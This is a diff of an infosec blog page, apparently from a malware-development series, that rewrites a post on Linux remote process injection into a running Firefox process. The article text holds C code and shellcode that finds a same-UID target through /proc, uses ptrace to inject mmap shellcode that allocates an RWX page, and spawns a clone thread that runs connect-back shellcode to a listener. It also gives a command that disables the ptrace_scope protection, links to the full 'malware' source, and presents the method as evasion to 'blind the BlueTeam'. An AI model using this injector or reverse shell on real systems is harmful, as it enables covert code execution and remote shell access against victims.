@@ -10,16 +10,15 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread) &middot; </title>
-  <meta name="title" content="Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread) &middot; " />
+  <title>Linux Remote Process Injection - Injecting into a firefox process &middot; </title>
+  <meta name="title" content="Linux Remote Process Injection - Injecting into a firefox process &middot; " />
   
   <meta name="description" content="An awesome infosec blog :)" />
-  <meta name="keywords" content="Linux Malware, Process Injection, " />
+  <meta name="keywords" content="Linux-Malware, Process-Injection, " />
   
   
   <link rel="canonical" href="https://mutur4.github.io/posts/remote-process-injection/" />
   
-  <link rel="alternate" type="application/rss+xml" href="/posts/remote-process-injection/index.xml" title="" />
   
   
   
@@ -31,9 +30,8 @@
   
   
   
-  
-  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.fcb6b8f47fcf9d08dccf3e85cedee48f9dd6c0a0178e95c67a74e69f9f0588e77e10dd8d49c8f6d925fe24eb977a3c36f555f882737ae3f73d21fc10c8402b52.css"
-    integrity="sha512-/La49H/PnQjczz6Fzt7kj53WwKAXjpXGenTmn58FiOd&#43;EN2NScj22SX&#43;JOuXejw29VX4gnN64/c9IfwQyEArUg==" />
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.f587ec5880888f327ab22498fc00acc8f48927ec5de6ccc85fe605b27bb9828ecbbcbdb3d383363a5d19cd29f8a8f6a1ec25be7bc3c1171f9cedf72ad3613c0f.css"
+    integrity="sha512-9YfsWICIjzJ6siSY/ACsyPSJJ&#43;xd5szIX&#43;YFsnu5go7LvL2z04M2Ol0ZzSn4qPah7CW&#43;e8PBFx&#43;c7fcq02E8Dw==" />
   
   
   <script type="text/javascript" src="/js/appearance.min.d9c603046c077ebf0e88cb0cc75a77d795076c4f973750e71410c9e530eed5bd3b48204bb18b980da897cb9feb8371ec5cecb0056a738ddf4ab9ed2ac4b331bb.js"
@@ -67,19 +65,48 @@
   
   
   
-  <meta property="og:title" content="Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread)" />
-<meta property="og:description" content="An awesome infosec blog :)" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://mutur4.github.io/posts/remote-process-injection/" /><meta property="og:image" content="https://mutur4.github.io/posts/remote-process-injection/featured.png"/>
+  <meta property="og:title" content="Linux Remote Process Injection - Injecting into a firefox process" />
+<meta property="og:description" content="Introduction #   When it comes to Linux/Unix we aren&rsquo;t provided with a bunch of sweet documented APIs as with Windows but instead are handed over a couple of system calls." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mutur4.github.io/posts/remote-process-injection/" /><meta property="og:image" content="https://mutur4.github.io/posts/remote-process-injection/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-04T13:50:30-04:00" />
+<meta property="article:modified_time" content="2023-10-04T13:50:30-04:00" />
 
 
   <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://mutur4.github.io/posts/remote-process-injection/featured.png"/>
-<meta name="twitter:title" content="Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread)"/>
-<meta name="twitter:description" content="An awesome infosec blog :)"/>
+<meta name="twitter:title" content="Linux Remote Process Injection - Injecting into a firefox process"/>
+<meta name="twitter:description" content="Introduction #   When it comes to Linux/Unix we aren&rsquo;t provided with a bunch of sweet documented APIs as with Windows but instead are handed over a couple of system calls."/>
 
   
-  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog Posts",
+    "name": "Linux Remote Process Injection - Injecting into a firefox process",
+    "headline": "Linux Remote Process Injection - Injecting into a firefox process",
+    
+    "abstract": "Introduction #   When it comes to Linux\/Unix we aren\u0026rsquo;t provided with a bunch of sweet documented APIs as with Windows but instead are handed over a couple of system calls.",
+    "inLanguage": "en",
+    "url" : "https:\/\/mutur4.github.io\/posts\/remote-process-injection\/",
+    "author" : {
+      "@type": "Person",
+      "name": "BinaryChunk"
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-10-04T13:50:30-04:00",
+    "datePublished": "2023-10-04T13:50:30-04:00",
+    
+    "dateModified": "2023-10-04T13:50:30-04:00",
+    
+    "keywords": ["Linux-Malware","Process-Injection"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1688"
+  }]
+  </script>
+
 
   
   
@@ -416,6 +443,16 @@
 
 
 
+<script>
+    (function () {
+        var $mainmenu = $('.main-menu');
+        var path = window.location.pathname;
+        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+            $(e).children('p').addClass('active');
+        });
+    })();
+</script>
+
 
   </div>
 </div>
@@ -433,10 +470,13 @@
       
 
 
-
-
-
-
+<article>
+  
+    
+     
+    
+    
+      
 
 
 <div id="hero" class="h-[150px] md:h-[200px]"></div>
@@ -464,9 +504,12 @@
     });
 </script>
 
- <header>
+    
   
-  <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
   
   
     
@@ -495,17 +538,34 @@
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
       href="/posts/remote-process-injection/"
-      >Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread)</a
+      >Linux Remote Process Injection - Injecting into a firefox process</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
 </ol>
 
 
-  
-  <h1 class="mt-5 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread)</h1>
-  <div class="mt-1 mb-2 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
     
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Linux Remote Process Injection - Injecting into a firefox process
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -530,15 +590,79 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
+  <time datetime="2023-10-04 13:50:30 -0400 EDT">4 October 2023</time><span class="px-2 text-primary-500">&middot;</span><span>1688 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+  
+
+  
+  
 </div>
 
 
-  </div>
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux-malware/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Linux Malware
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/process-injection/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Process-Injection
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+    </div>
   </header>
-  <section class="mt-12 prose flex max-w-full flex-col dark:prose-invert lg:flex-row">
-    
-    <div class="order-first px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
-      <div class="toc ltr:pl-5 rtl:pr-5 lg:sticky lg:top-10">
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+     
+    <div class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky  lg:top-10 ">
         <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
   <summary
     class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
@@ -550,9 +674,9 @@
   <ul>
     <li><a href="#introduction">Introduction</a>
       <ul>
-        <li><a href="#process-enumeration">Process Enumeration</a></li>
-        <li><a href="#memory-enumeration">Memory Enumeration</a></li>
-        <li><a href="#remote-mmap">Remote <code>mmap</code></a></li>
+        <li><a href="#process-enumeration">Process-Enumeration</a></li>
+        <li><a href="#address-space-enumeration">Address-Space Enumeration</a></li>
+        <li><a href="#remote-memory-mapping">Remote Memory Mapping</a></li>
         <li><a href="#remote-code-execution">Remote Code Execution</a></li>
       </ul>
     </li>
@@ -573,9 +697,9 @@
   <ul>
     <li><a href="#introduction">Introduction</a>
       <ul>
-        <li><a href="#process-enumeration">Process Enumeration</a></li>
-        <li><a href="#memory-enumeration">Memory Enumeration</a></li>
-        <li><a href="#remote-mmap">Remote <code>mmap</code></a></li>
+        <li><a href="#process-enumeration">Process-Enumeration</a></li>
+        <li><a href="#address-space-enumeration">Address-Space Enumeration</a></li>
+        <li><a href="#remote-memory-mapping">Remote Memory Mapping</a></li>
         <li><a href="#remote-code-execution">Remote Code Execution</a></li>
       </ul>
     </li>
@@ -607,8 +731,8 @@
         if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
 
         active.each(function (i, e) {
-           
-            $(e).removeClass('active').siblings('ul').hide();
+          
+            $(e).removeClass('active');
           
         });
         $toc.find('a[href="#' + id + '"]').addClass('active')
@@ -619,8 +743,6 @@
 
       $window.on('scroll', onScroll);
       $(document).ready(function () {
-         
-          $toc.find('a').parent('li').find('ul').hide();
         
         onScroll();
       });
@@ -629,10 +751,12 @@
 </script>
 
       </div>
-    </div>
-    
-    <div class="min-w-0 min-h-0 max-w-prose">
-      <div id="introduction" class="anchor"></div>
+      </div>
+      
+      <div class="min-w-0 min-h-0 max-w-prose">
+        
+
+        <div id="introduction" class="anchor"></div>
 <h2 class="relative group">Introduction 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
@@ -640,22 +764,23 @@
             style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a></span>        
     
 </h2>
+<hr>
 <p>When it comes to Linux/Unix we aren&rsquo;t provided with a bunch of sweet documented APIs as with <strong>Windows</strong> but instead are handed over a couple of system calls.</p>
-<p>For a simple <strong>Windows Process Injection</strong> technique, a process is somewhat able to map a new memory map on behalf of another remote process via <code>VirtualAllocEx</code> and has the ability to read and write into this memory region and at the same time having the ability to create a thread that will run in the context of that remote process via <code>CreateRemoteThread</code>.</p>
-<p><strong>Linux Process Injection</strong> is completely different in that we aren&rsquo;t provided with such interesting APIs <em>(I bet this is mentioned alot in other blog posts)</em>. In this post we will emulate the behaviour of the above mentioned Windows Process Injection technique by combining <code>ptrace</code>, <code>mmap</code> and the <code>clone</code> system calls to inject into firefox.</p>
-<p>The <strong>usage</strong> and <strong>knowledge</strong> of the <code>ptrace</code> system call for simple code injection is needed but not required. A more and somewhat detailed description is provided <a href="https://mutur4.github.io/posts/linux-malware-development/process-injection"   target="_blank">
+<p>For a simple <strong>Windows Process Injection</strong> technique, a process is somewhat able to map a new memory on behalf of another remote process via <code>VirtualAllocEx</code> and has the ability to read and write into this memory region and at the same time have the ability to create a thread that will run in the context of that remote process via <code>CreateRemoteThread</code>.</p>
+<p><strong>Linux Process Injection</strong> is completely different in that we aren&rsquo;t provided with such interesting APIs <em>(I bet this is mentioned alot in other blog posts)</em>. In this post we will emulate the behaviour of the above mentioned Windows Process Injection technique by combining <code>ptrace</code>, <code>mmap</code> and the <code>clone</code> system calls to inject into a live Firefox Process.</p>
+<p>The <strong>usage</strong> and <strong>knowledge</strong> of the <code>ptrace</code> system call for simple code injection is needed but not required. A detailed description is as provided <a href="https://mutur4.github.io/posts/linux-malware-development/process-injection"   target="_blank">
     here</a></p>
 <div id="process-enumeration" class="anchor"></div>
-<h3 class="relative group">Process Enumeration 
+<h3 class="relative group">Process-Enumeration 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
             style="text-decoration-line: none !important;" href="#process-enumeration" aria-label="Anchor">#</a></span>        
     
 </h3>
-<p><strong>Process Enumeration</strong> is key in injection since we want to find a suitable process where we can inject our code. This is helpful in finding a process owned by us <em>(same uid)</em> and also having a fail-safe when an injection into another process fails.</p>
+<p><strong>Process Enumeration</strong> is key in process injection since we want to find a suitable process where we can inject our code. This is helpful in finding a process owned by us <em>(same uid)</em> and also having a fail-safe when an injection into another process fails.</p>
 <p>Linux Processes can be enumerated by parsing the <code>/proc</code> directory and looking for &rsquo;numbered&rsquo; directories. For example, a process with  pid of <code>1337</code> will have its information stored at <code>/proc/1337/</code>.</p>
-<p>The <code>UID</code> of a process will also be stored at  <code>/proc/&lt;PID&gt;/status</code> file as shown for an example process below.</p>
+<p>The <code>UID</code> of the user that owns the process is stored in the <code>/proc/&lt;PID&gt;/status</code> file as shown for an example process below.</p>
 <p>
 
 
@@ -667,7 +792,7 @@
   </figure>
 
 </p>
-<p>The following <code>C</code> code snippet will simply enumerate all processes to check for a valid firefox process that shares the same <code>UID</code> as the injecting process <code>getuid()</code> and returns information about this process in a struct variable for injection.</p>
+<p>The following <code>C</code> code snippet will enumerate all processes to check for a valid <strong>Firefox</strong> process that shares the same <code>UID</code> as the injecting process <code>getuid()</code>. The information about this process is stored in a struct variable that will come in handly later when we initiate code injection.</p>
 
   
   
@@ -700,7 +825,7 @@
   <span
     
       class="dark:text-neutral-300"
-    >The code snippet is compatible in that it can return any specific process for injection in this case <code>firefox</code> or injection can be limited to any process that is run in our <code>uid</code> context.</span>
+    >The code snippet below is compatible in that it can be modified to inject into a chosen process other than Firefox or automatically left to inject into a randomly chosen process that shares the same <code>UID</code>.</span>
 </div>
 
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">PPROCESS</span> <span class="nf">enumProcs</span><span class="p">(){</span>
@@ -767,15 +892,15 @@
 </span></span><span class="line"><span class="cl">        <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">head</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><div id="memory-enumeration" class="anchor"></div>
-<h3 class="relative group">Memory Enumeration 
+</span></span></code></pre></div><div id="address-space-enumeration" class="anchor"></div>
+<h3 class="relative group">Address-Space Enumeration 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#memory-enumeration" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#address-space-enumeration" aria-label="Anchor">#</a></span>        
     
 </h3>
-<p>After a suitable process is enumerated and returned, we need to enumerate its memory map to find an address range that is executable <code>(rwp)?x</code>. This address is returned by parsing and reading the <code>/proc/&lt;pid&gt;/maps</code> file.</p>
+<p>After a suitable remote process is enumerated and returned <em>(in this case our FireFox Process)</em>, we need to enumerate its <strong>Virtual Address Space</strong> to find an address range that is executable <code>(rwp)?x</code>. This address is returned by parsing and reading the <code>/proc/&lt;pid&gt;/maps</code> file.</p>
 
   
 
@@ -804,10 +929,10 @@
   <span
     
       class="dark:text-neutral-300"
-    >Code Injection happens via <code>ptrace</code> so the enumerated process map should not necessarily be writable or readable but executable for code execution.</span>
+    >code-injection happens via <code>ptrace</code> that does not necessarily need a writable/readable memory block to perform its actions.</span>
 </div>
 
-<p>The following <code>C</code> source code snippet performs this enumeration and returns the executable address range that is searched via the <code>strstr</code> function.</p>
+<p>The following <code>C</code> source code snippet performs this enumeration and returns an executable address range that is searched via the <code>strstr</code> function.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">PADDRESS</span> <span class="nf">enumAddress</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">CMDLINESZ</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">        <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
@@ -834,20 +959,20 @@
 </span></span><span class="line"><span class="cl"><span class="nl">end</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><div id="remote-mmap" class="anchor"></div>
-<h3 class="relative group">Remote <code>mmap</code> 
+</span></span></code></pre></div><div id="remote-memory-mapping" class="anchor"></div>
+<h3 class="relative group">Remote Memory Mapping 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#remote-mmap" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#remote-memory-mapping" aria-label="Anchor">#</a></span>        
     
 </h3>
-<p>A new allocated page in the target process is required for the following reasons:</p>
+<p>A new allocated memory map in the <strong>Virtual Address Space</strong> of the remote process is required for the following reasons:</p>
 <ul>
-<li>This will pevent overwriting existing data in the memory of the remote process that could affect the proper execution of the remote process.</li>
-<li>An <strong>executable</strong> page for code injection with no length restrictions limiting the second-staged payload.</li>
+<li>This will pevent overwriting existing data in the memory of the remote process that could affect the proper execution of that remote process.</li>
+<li>An <strong>executable</strong> page for code injection with no length restrictions limiting the second-staged payload (shellcode).</li>
 </ul>
-<p>For the allocation of this page, we need a first staged-payload that will be executed by the remote process for allocation. The executable page/memory returned by the above <code>enumAddress</code> function will be used for the execution of the following shellcode that uses <code>mmap</code> to map a new <code>RWX</code> page.</p>
+<p>For the allocation of this page, we need a first <em>stage-payload</em> that will be executed by the remote process to allocate memory. The executable page/memory returned by the above <code>enumAddress</code> function will be used for the execution of the following shellcode that uses <code>mmap</code> to map a new <code>RWX</code> page.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="mi">0x22</span>
 </span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="no">rcx</span>
 </span></span><span class="line"><span class="cl">
@@ -897,11 +1022,11 @@
   <span
     
       class="dark:text-neutral-300"
-    >A backup for the data initially in that <strong>executable</strong> address is created and will be copied back after our shellcode is executed.</span>
+    >The above shellcode was written in a region that obviously had existing data and since we do not want to disrupt normal execution of the remote Firefox Process, we will create a backup and copy it back after the first stage-payload is done with execution.</span>
 </div>
 
-<p>The above shellcode is written to this address and the <code>rip</code> register is modified to point to this address for shellcode execution. The <code>int3</code> instruction added at the end of the shellcode is used as an identifier to know shellcode was executed. This is because of a returned <code>SIGTRAP</code> signal a technique described at [1].</p>
-<p>The following is the code snippet for the process described above .</p>
+<p>The above shellcode is written to the returned address and the <code>rip</code> register is modified to point to this address for code execution. The <code>int3</code> instruction added at the end of the above shellcode is used as a trigger to let us know that our shellcode was succesfully executed. This is because of a returned <code>SIGTRAP</code> signal a technique described at [1].</p>
+<p>The following code snippet performs the process described above.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">		<span class="n">PADDRESS</span> <span class="n">address</span> <span class="o">=</span> <span class="n">enumAddress</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
@@ -939,7 +1064,7 @@
 </span></span><span class="line"><span class="cl">                <span class="k">goto</span> <span class="n">shellcodeExec</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span></code></pre></div><p>The above code snippet with then save the returned page/address to be later used for the second-staged payload.</p>
+</span></span></code></pre></div><p>The memory address of the newly allocated <code>(RWX)</code> region is returned to be used in the second-stage payload.</p>
 <div id="remote-code-execution" class="anchor"></div>
 <h3 class="relative group">Remote Code Execution 
     <span
@@ -948,8 +1073,9 @@
             style="text-decoration-line: none !important;" href="#remote-code-execution" aria-label="Anchor">#</a></span>        
     
 </h3>
-<p>The second-staged payload <em>(emulating <code>CreateRemoteThread</code>)</em> can now be written into the newly allocated page for execution. The aim was to come up with a shellcode that would not affect the execution of the remote process at all cost and should be able to run as its own process. The <code>clone</code> syscall is interesting because it can be used to implement both <code>threads</code> (light-weight processes) and child process based on arguments pass to it i.e <code>CLONE_VM</code>.</p>
-<p>The following is part of the shellcode used to emulate <code>CreateRemoteThread</code> by spawning a remote thread that should connect back to an attacker&rsquo;s machine for <strong>Remote Code Execution</strong>.</p>
+<p>The second-staged payload <em>(emulating <code>CreateRemoteThread</code>)</em> can now be written into the newly allocated page for execution. The aim was to come up with a shellcode that would not affect the execution of the remote process at all cost and should be able to run as its own separate <strong>process</strong> or <strong>thread</strong>.</p>
+<p>The <code>clone</code> syscall is interesting because it can be used to implement both <code>threads</code> <em>(light-weight processes)</em> and <em>child processes</em> based on arguments pass to it <em>i.e</em> <code>CLONE_VM</code>.</p>
+<p>The following is part of the shellcode used to emulate <code>CreateRemoteThread</code> by spawning a remote thread that connect&rsquo;s back to an attacker&rsquo;s machine for <strong>Remote Code Execution</strong>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rdi</span><span class="c">;
 </span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">or</span> <span class="no">rdi</span><span class="p">,</span> <span class="mi">0x800100</span> <span class="c">;CLONE_UNTRACED | CLONE_VM
 </span></span></span><span class="line"><span class="cl"><span class="c"></span>
@@ -966,7 +1092,7 @@
 </span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="err">&lt;</span><span class="no">Connect-Back</span> <span class="no">Shellcode</span> <span class="no">address</span><span class="err">&gt;</span> <span class="c">;JMP to connect-back shellcode
 </span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">int3</span> <span class="c">;raise a SIGTRAP
 </span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">...</span>
-</span></span></code></pre></div><p>When the above shellcode is executed, the spawned thread <em>(that see&rsquo;z a PID of 0)</em> will execute the connect back shellcode connecting to localhost at port <code>1337</code> and on the other hand, the parent proccess will raise a <code>SIGTRAP</code> letting us know that the shellcode execution was a success, therefore allowing us to restore the back&rsquo;d up data and resume execution of the remote process from <em><strong>ptrace&rsquo;s</strong></em> <code>SIGSTOP</code>.</p>
+</span></span></code></pre></div><p>When the above shellcode is executed, the spawned thread <em>(that see&rsquo;z a PID of <code>0</code>)</em> will execute the connect back shellcode connecting to <code>localhost:1337</code>. On the other hand, the parent proccess will raise a <code>SIGTRAP</code> letting us know that shellcode execution was a success, therefore allowing us to restore the back&rsquo;d up data and resume execution of the remote process from <em><strong>ptrace&rsquo;s</strong></em> <code>SIGSTOP</code>.</p>
 <p>The following is the source code snippet that writes code into the new mmap&rsquo;d region and returns execution back to the remote process.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nl">shellcodeExec</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="cm">/* ----- Write and Execute shellcode stored in the newly mmap&#39;d region ----*/</span>
@@ -993,7 +1119,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl">        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldregs</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-</span></span></code></pre></div><p>The following shows a successful execution of the injector injecting into a <code>firefox</code> process.</p>
+</span></span></code></pre></div><p>The following shows a successful execution of the injector injecting into a <code>Firefox</code> process.</p>
 <p>
 
 
@@ -1005,7 +1131,7 @@
   </figure>
 
 </p>
-<p>The following is the task-manager screenshot on Kali Linux showing an <code>sh</code> process as a child process of the above <code>firefox</code> process. This is similar to the common <code>cmd.exe</code> as a child process of an unsual process in Windows mainly an <code>IOC</code> for Remote Process Injection.</p>
+<p>The following is the task-manager on Kali Linux showing an <code>sh</code> process as a child process of the above <code>Firefox</code> process with the same <code>PID</code>. This is similar to the common <code>cmd.exe</code> as a child process of an unsual suspicious process in Windows mainly an <code>IOC</code> for Remote Process Injection.</p>
 <p>
 
 
@@ -1017,7 +1143,7 @@
   </figure>
 
 </p>
-<p>The following show as successful connection to our listening port.</p>
+<p>The following show as successful connect-back to ur listening port.</p>
 <p>
 
 
@@ -1029,8 +1155,8 @@
   </figure>
 
 </p>
-<p>The complete code injection malware can be found <a href="https://github.com/mutur4/Linux-Malware/blob/main/Process.Injection/code_process_injector.c"   target="_blank">
-    here</a>. The <code>strstr</code> function inside the <code>EnumProcess</code> function can be modified to inject into a specific process or it can be commented out for injection into a random process.</p>
+<p>The complete code injection malware can be found <a href="https://github.com/mutur4/Linux-Malware/blob/main/Process.Injection/firefox-injector.c"   target="_blank">
+    here</a>. The <code>strstr</code> function inside the <code>EnumProcess</code> function can be modified to inject into a specific process that suits you needs or it can be commented out to let the injector inject into a random process.</p>
 <p>One of the major caveat&rsquo;s about <code>ptrace</code> is that there is a protection/mitigation where the Kernel is configured to prevent any process from calling <code>ptrace</code> on another process that it did not create via <code>fork</code>.If this feature is enabled the above process injector will not work. This can be temporarily disabled until the next boot using the following command.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">0</span> <span class="p">|</span> sudo tee /proc/sys/kernel/yama/ptrace_scope
 </span></span></code></pre></div><div id="conclusion" class="anchor"></div>
@@ -1041,7 +1167,8 @@
             style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span>        
     
 </h2>
-<p>This was a Linux Process Injection technique that was aimed at emulating the Windows <code>CreateRemoteThread</code> and <code>VirtualAllocEx</code> injection process.</p>
+<hr>
+<p>This was a Linux Process Injection technique that was aimed at emulating the Windows <code>CreateRemoteThread</code> and <code>VirtualAllocEx</code> injection process to inject into a Live Firefox process for remote code execution. This is a nice evasion technique that should blind the BlueTeam.</p>
 <div id="references" class="anchor"></div>
 <h2 class="relative group">References 
     <span
@@ -1050,6 +1177,7 @@
             style="text-decoration-line: none !important;" href="#references" aria-label="Anchor">#</a></span>        
     
 </h2>
+<hr>
 <ul>
 <li>[1] <a href="https://github.com/gaffe23/linux-inject"   target="_blank">
     https://github.com/gaffe23/linux-inject</a></li>
@@ -1057,26 +1185,81 @@
     https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/</a></li>
 </ul>
 
+        </br></br>
+        
+
+      </div>
+      <script>
+        var oid = "views_posts\/remote-process-injection\/index.md"
+        var oid_likes = "likes_posts\/remote-process-injection\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
+  </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+  
+    
+    
+    
+      
+      
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/defense-evasion/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Linux Malware: Defense Evasion Techniques</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-07-15 06:35:51 -0400 EDT">15 July 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
